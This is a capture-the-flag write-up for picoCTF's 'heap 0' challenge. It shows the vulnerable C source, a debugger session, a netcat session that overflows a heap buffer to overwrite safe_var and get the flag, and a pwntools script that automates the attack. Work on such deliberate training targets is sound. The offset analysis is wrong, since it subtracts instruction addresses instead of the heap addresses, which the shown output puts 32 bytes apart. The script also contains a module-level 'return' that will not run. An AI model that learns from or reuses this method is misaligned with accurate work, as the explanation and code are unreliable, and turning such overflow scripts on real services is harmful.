# heap 0

Level: Easy

## Initial Thoughts
This challenge is called heap, so right away I am thinking we are going to be working with the heap somehow.

This thought was solidified further after reading the description:
```text
Are overflows just a stack concern
```

So we are likely not working with the stack, but rather the heap

As always, I launched the instance and saw three new things:
1. The program source file: `chall.c`
2. The program binary file: `chall`
3. A server to connect to via netcat: `nc tethys.picoctf.net <port>`

Right away, I checked out the source file and the binary.

First, the source file:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64
// amount of memory allocated for input_data
#define INPUT_DATA_SIZE 5
// amount of memory allocated for safe_var
#define SAFE_VAR_SIZE 5

int num_allocs;
char *safe_var;
char *input_data;

void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}

void print_menu() {
    printf("\n1. Print Heap:\t\t(print the current state of the heap)"
           "\n2. Write to buffer:\t(write to your own personal block of data "
           "on the heap)"
           "\n3. Print safe_var:\t(I'll even let you look at my variable on "
           "the heap, "
           "I'm confident it can't be modified)"
           "\n4. Print Flag:\t\t(Try to print the flag, good luck)"
           "\n5. Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {
    printf("\nWelcome to heap0!\n");
    printf(
        "I put my data on the heap so it should be safe from any tampering.\n");
    printf("Since my data isn't on the stack I'll even let you write whatever "
           "info you want to the heap, I already took care of using malloc for "
           "you.\n\n");
    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("Heap State:\n");
    printf("+-------------+----------------+\n");
    printf("[*] Address   ->   Heap Data   \n");
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", safe_var, safe_var);
    printf("+-------------+----------------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();
    print_heap();

    int choice;

    while (1) {
        print_menu();
	int rval = scanf("%d", &choice);
	if (rval == EOF){
	    exit(0);
	}
        if (rval != 1) {
            //printf("Invalid input. Please enter a valid choice.\n");
            //fflush(stdout);
            // Clear input buffer
            //while (getchar() != '\n');
            //continue;
	    exit(0);
        }

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf("\n\nTake a look at my variable: safe_var = %s\n\n",
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

What's going on here? I notice a few things immediately:
1. When the `check_win()` function is called, it is checkin gto see if the `safe_var` doesn't equal to "bico". This means that we are going to want to write overwrite "bico" in `safe_var` somehow...
2. We see. we are able to write to `input_data`, but I bet we can overflow it by finding the offset between `input_data` and `safe_var`, then writing more than that.

Let's try it!

## Solving the Challenge
First, let's find the offset

Let's fire up `gdb` with the program binary (I'll be using `pwngdb` which is just a flavor of `gdb`, but is highly recommended).
```sh
$ pwndbg ./chall
Reading symbols from ./chall...
pwndbg: loaded 190 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
------- tip of the day (disable with set show-tips off) -------
Pwndbg context displays where the program branches to thanks to emulating few instructions into the future. You can disable this with set emulate off which may also speed up debugging
pwndbg> disassemble print_heap 
Dump of assembler code for function print_heap:
   0x0000000000001330 <+0>:     push   r14
   0x0000000000001332 <+2>:     push   rbx
   0x0000000000001333 <+3>:     push   rax
   0x0000000000001334 <+4>:     lea    rdi,[rip+0xfae]        # 0x22e9
   0x000000000000133b <+11>:    call   0x1030 <puts@plt>
   0x0000000000001340 <+16>:    lea    rbx,[rip+0xfce]        # 0x2315
   0x0000000000001347 <+23>:    mov    rdi,rbx
   0x000000000000134a <+26>:    call   0x1030 <puts@plt>
   0x000000000000134f <+31>:    lea    rdi,[rip+0xf9f]        # 0x22f5
   0x0000000000001356 <+38>:    call   0x1030 <puts@plt>
   0x000000000000135b <+43>:    mov    rdi,rbx
   0x000000000000135e <+46>:    call   0x1030 <puts@plt>
   0x0000000000001363 <+51>:    mov    rdx,QWORD PTR [rip+0x2d16]        # 0x4080 <input_data>
   0x000000000000136a <+58>:    lea    r14,[rip+0xe0e]        # 0x217f
   0x0000000000001371 <+65>:    mov    rdi,r14
   0x0000000000001374 <+68>:    mov    rsi,rdx
   0x0000000000001377 <+71>:    xor    eax,eax
   0x0000000000001379 <+73>:    call   0x1040 <printf@plt>
   0x000000000000137e <+78>:    mov    rdi,rbx
   0x0000000000001381 <+81>:    call   0x1030 <puts@plt>
   0x0000000000001386 <+86>:    mov    rdx,QWORD PTR [rip+0x2ceb]        # 0x4078 <safe_var>
   0x000000000000138d <+93>:    mov    rdi,r14
   0x0000000000001390 <+96>:    mov    rsi,rdx
   0x0000000000001393 <+99>:    xor    eax,eax
   0x0000000000001395 <+101>:   call   0x1040 <printf@plt>
   0x000000000000139a <+106>:   mov    rdi,rbx
   0x000000000000139d <+109>:   call   0x1030 <puts@plt>
   0x00000000000013a2 <+114>:   mov    rax,QWORD PTR [rip+0x2c37]        # 0x3fe0
   0x00000000000013a9 <+121>:   mov    rdi,QWORD PTR [rax]
   0x00000000000013ac <+124>:   call   0x1080 <fflush@plt>
   0x00000000000013b1 <+129>:   add    rsp,0x8
   0x00000000000013b5 <+133>:   pop    rbx
   0x00000000000013b6 <+134>:   pop    r14
   0x00000000000013b8 <+136>:   ret
End of assembler dump.
```

Voiala. From that, we see we have the address `0x0000000000001363` for `input_data` and `0x0000000000001386` for `safe_var`. We can subtract these and we get 0x23, or 35 in decimal. Perfect. Now we can enter in 35 or more bytes and we will get our flag!

Let's run the service and see if this works:
```
$ nc tethys.picoctf.net 62816

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5c68bb7db2b0  ->   pico
+-------------+----------------+
[*]   0x5c68bb7db2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5c68bb7db2b0  ->   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+-------------+----------------+
[*]   0x5c68bb7db2d0  ->   AAAA
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{<censored>}
```

That's great, but now let's automate it! We can use `pwntools` for this:

```python
from pwn import *
import re               
import sys

if (len(sys.argv)<=1):
  print("Please pass the port as a parameter")
  return

conn = remote('tethys.picoctf.net', sys.argv[1]) # connect to host

addrs = re.findall(r'0x[0-9a-fA-F]+', conn.recvuntil(b'Enter your choice:').decode()) # parse out the addrs
pico_addr, bico_addr = [int(addr, 16) for addr in addrs] # assign the respective addrs via the addrs []

offset = bico_addr - pico_addr # calc the offset

# send the data stuff
conn.sendline('2'.encode())
conn.recvuntil(b"Data for buffer:")
conn.sendline(b'A'*offset);
#conn.recvuntil(b'Data for buffer:')
conn.sendline('4'.encode())

conn.interactive()
```